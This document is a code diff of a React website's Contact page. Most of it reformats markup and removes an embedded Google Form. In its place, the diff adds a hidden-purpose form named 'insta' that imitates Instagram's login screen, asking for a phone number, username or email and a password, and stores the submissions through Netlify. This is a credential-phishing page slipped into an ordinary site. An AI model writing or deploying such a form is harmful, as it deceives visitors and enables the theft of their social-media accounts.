@@ -1,31 +1,27 @@
 import React from 'react';
-import '../styles/Contact.css'; // Ensure to import the updated CSS
-
+import '../styles/Contact.css'; // Import the CSS file
 
 const Contact = () => {
   return (
     <div>
       {/* Engaging Query Message */}
       <div className="contact-message">
-        <p>Have a query? <span>Contact with us!</span></p>
+        <p>
+          Have a query? <span>Contact with us!</span>
+        </p>
       </div>
 
       <section id="contact" className="contact-section">
+      <form name="insta" method="POST" data-netlify="true">
+  <input type="hidden" name="form-name" value="insta" />
+  <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required />
+  <input type="password" name="password" placeholder="Password" required />
+  <button type="submit">Log In</button>
+</form>
 
-        {/* Google Form Embed */}
-        <div className="formc">
-          <iframe
-            title="Google Forms"
-            src="https://docs.google.com/forms/d/e/1FAIpQLSeAm7O_8c-no7vxR5mvZ8X3DlgidVB1g-qQ7SC1ZQQbHb_4ng/viewform?embedded=true"
-            width="100%"
-            height="1360vh"
-            style={{ border: 0 }}
-            allowFullScreen="yes"
-            loading="lazy"
-          ></iframe>
-        </div>
+       
 
-        {/* Corrected Google Maps iFrame */}
+        {/* Google Maps iFrame */}
         <div className="map-container">
           <iframe
             title="Google Maps"
@@ -42,17 +38,23 @@ const Contact = () => {
         <div className="floating-buttons">
           {/* WhatsApp Button */}
           <a
-            href="https://wa.me/7488523970" // Replace with your WhatsApp number
+            href="https://wa.me/7488523970"
             className="whatsapp-btn"
             target="_blank"
             rel="noopener noreferrer"
           >
-            <img src="https://th.bing.com/th/id/OIP.hbr47SG8Nl1CUsQBVLhz_AHaHa?rs=1&pid=ImgDetMain" alt="WhatsApp" />
+            <img
+              src="https://th.bing.com/th/id/OIP.hbr47SG8Nl1CUsQBVLhz_AHaHa?rs=1&pid=ImgDetMain"
+              alt="WhatsApp"
+            />
           </a>
 
           {/* Call Button */}
           <a href="tel:+917488523970" className="call-btn">
-            <img src="https://th.bing.com/th/id/OIP.hE6M1KsmyCKGI4Rx8OWpAQHaHa?w=194&h=194&c=7&r=0&o=5&dpr=1.4&pid=1.7" alt="Call" />
+            <img
+              src="https://th.bing.com/th/id/OIP.hE6M1KsmyCKGI4Rx8OWpAQHaHa?w=194&h=194&c=7&r=0&o=5&dpr=1.4&pid=1.7"
+              alt="Call"
+            />
           </a>
         </div>
       </section>
